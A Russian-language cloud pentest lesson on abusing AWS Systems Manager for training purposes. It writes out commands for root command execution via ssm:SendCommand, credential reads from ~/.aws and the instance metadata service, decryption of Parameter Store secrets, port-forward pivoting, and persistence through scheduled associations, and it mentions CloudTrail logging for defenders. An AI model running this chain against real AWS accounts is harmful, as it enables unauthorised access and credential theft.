---
id: cloud-aws-ssm
title: "SSM: Run Command, Parameter Store и Session Manager"
category: cloud
parent: cloud-aws-deep
difficulty: hard
order: 3
tags: [cloud, aws, ssm, run-command, parameter-store, session-manager, rce]
prerequisites: [cloud-aws-deep, cloud-iam-basics]
useful_for:
  - "RCE на парке EC2 через SSM"
  - "Кража секретов из Parameter Store"
  - "Пентест внутренней инфраструктуры AWS"
estimated_minutes: 50
summary: "Как ssm:SendCommand превращается в выполнение кода на инстансах, где лежат секреты в Parameter Store и как Session Manager даёт интерактивный доступ без SSH."
---

## Задача

**AWS Systems Manager (SSM)** — это «удалённое управление парком»: обновления, инвентаризация, запуск команд, хранение параметров, интерактивные сессии. Для защитников это способ убрать SSH-ключи и bastion. Для атакующего это **RCE-as-a-service**: право `ssm:SendCommand` позволяет выполнять команды на инстансе от имени `root`, **без единого открытого порта**.

Цель урока: превратить права SSM в выполнение кода и креды.

## Данные, с которыми работаем

Разберём компоненты:
- **SSM Agent** — демон на инстансе, который держит **исходящее** соединение к сервису SSM. Входящие порты не нужны.
- **Managed instance** — инстанс, зарегистрированный в SSM (id вида `mi-...`).
- **Documents** — скрипты; главный — `AWS-RunShellScript`.
- **Run Command** — `ssm:SendCommand` исполняет документ на инстансах.
- **Parameter Store** — хранилище параметров; `SecureString` шифруется KMS.
- **Session Manager** — интерактивный shell без SSH.

Смотрим, какие инстансы управляются:

```bash
$ aws ssm describe-instance-information \
    --query 'InstanceInformationList[].{Id:InstanceId,Platform:PlatformName,Ping:PingStatus}'
[{"Id":"i-0abc123","Platform":"Linux","Ping":"Online"}]
```

Инстанс `i-0abc123` онлайн. Проверяем, что наша роль умеет:

```bash
$ aws iam simulate-principal-policy \
    --policy-source-arn arn:aws:iam::111122223333:role/app \
    --action-names ssm:SendCommand --resource-arns "*" \
    --query 'EvaluationResults[0].EvalDecision'
"allowed"
```

## Шаг 1: запускаем команду

`send-command` возвращает `CommandId` — по нему потом читаем результат:

```bash
$ aws ssm send-command --document-name "AWS-RunShellScript" \
    --targets "Key=instanceids,Values=i-0abc123" \
    --parameters 'commands=["whoami","id","cat /home/ec2-user/.aws/credentials 2>/dev/null"]' \
    --query 'Command.CommandId' --output text
8f2c-1234
```

## Шаг 2: читаем вывод

Подождав пару секунд, забираем результат. До завершения `get-command-invocation` вернёт `InProgress`:

```bash
$ aws ssm get-command-invocation --command-id 8f2c-1234 --instance-id i-0abc123 \
    --query 'StandardOutputContent' --output text
root
uid=0(root) gid=0(root) groups=0(root)
[default]
aws_access_key_id = AKIA...
aws_secret_access_key = wJalr...
```

Мы — **root** на инстансе, и там лежат креды ещё одного пользователя. SSM-агент исполняет команды от root, поэтому это прямой RCE.

## Шаг 3: выясняем креды роли инстанса

У инстанса почти всегда есть **instance profile** — роль, привязанная к EC2. Её креды выдаёт metadata-сервис:

```bash
$ aws ssm send-command --document-name "AWS-RunShellScript" \
    --targets "Key=instanceids,Values=i-0abc123" \
    --parameters 'commands=["curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/"]' \
    --query 'Command.CommandId' --output text
9a1b-5678
$ aws ssm get-command-invocation --command-id 9a1b-5678 --instance-id i-0abc123 \
    --query 'StandardOutputContent' --output text
WebServerRole
```

Роль инстанса `WebServerRole` обычно шире, чем наша. Забираем её креды:

```bash
$ aws ssm send-command --document-name "AWS-RunShellScript" \
    --targets "Key=instanceids,Values=i-0abc123" \
    --parameters 'commands=["curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/WebServerRole"]'
```

## Шаг 4: читаем Parameter Store

Часто именно в Parameter Store лежат пароли БД и токены:

```bash
$ aws ssm get-parameters-by-path --path "/prod/" --recursive --with-decryption \
    --query 'Parameters[].{Name:Name,Value:Value}' --output table
---------------------------------------------
|  Name              |  Value               |
|  /prod/db/password |  Prod_DB_S3cret!     |
|  /prod/api/token   |  sk_live_51H...      |
---------------------------------------------
```

`--with-decryption` расшифровывает `SecureString`. Цепочка готова: `ssm:SendCommand` → root → instance profile → Parameter Store → пароль БД → lateral movement.

## Полный прогон от начала до конца

1. `describe-instance-information` → нашли managed instance.
2. `send-command` с `whoami` → root на инстансе.
3. Прочитали креды из `~/.aws` и metadata → роль инстанса.
4. `get-parameters-by-path --with-decryption` → пароль БД и API-токен.

## Если SendCommand запрещён: Session Manager и другие права

- **Session Manager.** Право `ssm:StartSession` — **независимое** от `SendCommand`. Оно даёт интерактивный shell и port forwarding:

```bash
$ aws ssm start-session --target i-0abc123
sh-5.2$
```

- **Port forwarding** через инстанс — pivot без установки туннельного бинарника:

```bash
$ aws ssm start-session --target i-0abc123 \
    --document-name AWS-StartPortForwardingSession \
    --parameters '{"portNumber":["3306"],"localPortNumber":["13306"]}'
```

Теперь `mysql -h 127.0.0.1 -P 13306` идёт к БД во внутренней подсети.

- **`ssm:GetParameter` без RCE.** Иногда права на конкретный путь уже дают пароль БД — не поднимай Run Command там, где хватит чтения параметра.
- **Windows.** Документ `AWS-RunPowerShellScript` даёт исполнение от `NT AUTHORITY\SYSTEM`.
- **Персистентность.** `ssm:CreateAssociation` с расписанием выполняет команду периодически; можно положить свой SSH-ключ в `authorized_keys`.
- **Hybrid activations.** SSM регистрирует on-prem сервер как managed instance — тогда `SendCommand` исполняет код **вне облака**, в ДЦ компании.

## Частые ошибки и подводные камни

- **Инстанс не managed.** Без SSM-агента и instance profile с `AmazonSSMManagedInstanceCore` команда не сработает.
- **Ждать вывода сразу.** `get-command-invocation` до завершения вернёт `InProgress` — нужна пауза или поллинг.
- **Забывать про квоту вывода.** Вывод усечён (~24 КБ); большие файлы выгружайте в S3 частями.
- **Не проверять `get-caller-identity`.** Убедитесь, что это ваш доступ, а не общая роль.
- **Считать, что SSM тихий.** Каждое `SendCommand`/`StartSession`/`GetParameter` пишется в CloudTrail.
- **Путать `SendCommand` и `StartSession`.** Это независимые права; наличие только второго тоже даёт интерактивный доступ.

- **Игнорировать Windows-парк.** Для Windows нужен документ `AWS-RunPowerShellScript`, и исполнение идёт от `NT AUTHORITY\SYSTEM`.
- **Считать, что SSM только про EC2.** Hybrid activations регистрируют on-prem серверы, а ECS-задачи могут быть managed instances.

- **Не проверять Parameter Store заранее.** Иногда чтения одного параметра достаточно, и поднимать Run Command не нужно.

- **Забывать про ассоциации.** `ssm:CreateAssociation` даёт персистентность — команда выполняется по расписанию без вашего участия.

## Что мы теперь знаем

- `ssm:SendCommand` = RCE от root/SYSTEM без открытых портов (агент ходит исходящим соединением).
- `get-command-invocation` возвращает вывод команды после завершения.
- На инстансе лежат креды instance profile (metadata) и часто `~/.aws`.
- Parameter Store (`--with-decryption`) — типовое хранилище паролей и токенов.
- `ssm:StartSession` — независимое право, даёт shell и port forwarding.
- SSM «громкий»: каждое действие пишется в CloudTrail.

## На что смотреть дальше

- **aws-ecs**: task role и `ExecuteCommand` как аналог SSM для контейнеров.
- **cloud-network-security**: сетевые барьеры, которые SSM обходит.
- **cloud-privesc-iam**: что делать с кредами роли инстанса.

## Квиз

Проверь себя.

```quiz
- question: "От какого пользователя SSM Run Command исполняет команды на Linux-инстансе?"
  options:
    - "root"
    - "ssm-user без прав"
    - "nobody"
    - "ec2-user без sudo"
  answer: 0
  explanation: "SSM-агент запускает AWS-RunShellScript от root, поэтому это прямой RCE."
- question: "Почему для SSM не нужен открытый входящий порт?"
  options:
    - "Агент сам устанавливает исходящее соединение к сервису SSM"
    - "SSM использует SSH-порт"
    - "SSM работает только локально"
    - "SSM использует DNS"
  answer: 0
  explanation: "Агент polling-ом держит исходящий канал, поэтому bastion и SSH не нужны."
- question: "Где часто лежат пароли БД для следующего шага?"
  options:
    - "В SSM Parameter Store (SecureString)"
    - "В Route 53"
    - "В CloudFront"
    - "В IAM-политике"
  answer: 0
  explanation: "Parameter Store — типовое хранилище секретов приложений и CI."
- question: "Как прочитать вывод команды Run Command?"
  options:
    - "Через get-command-invocation по CommandId"
    - "Через S3 по умолчанию"
    - "Через email"
    - "Никак, вывод недоступен"
  answer: 0
  explanation: "GetCommandInvocation возвращает StandardOutputContent после завершения."
- question: "Почему Session Manager — отдельный вектор?"
  options:
    - "Право ssm:StartSession независимо от SendCommand и даёт shell и port forwarding"
    - "Он требует открытый порт 22"
    - "Он работает только на Windows"
    - "Он отключает CloudTrail"
  answer: 0
  explanation: "StartSession — самостоятельное право; даже без SendCommand вы получаете доступ."
```

## Куда дальше

В следующем уроке мы разберём **ECS и Fargate** — task role и `ExecuteCommand` как аналог SSM для контейнеров. А пока главное запомни: **SSM превращает облачные права в код на парке машин без единого порта**, и `SendCommand` от root стоит дороже любого открытого SSH.

## Где пригодится

- **Пентест AWS:** превращение прав SSM в RCE и креды.
- **Red team:** pivot через управляемые инстансы без SSH.
- **Bug bounty:** редко, но SSM-мисконфиги встречаются.
- **Blue team:** аудит прав SendCommand/StartSession и логирование сессий.
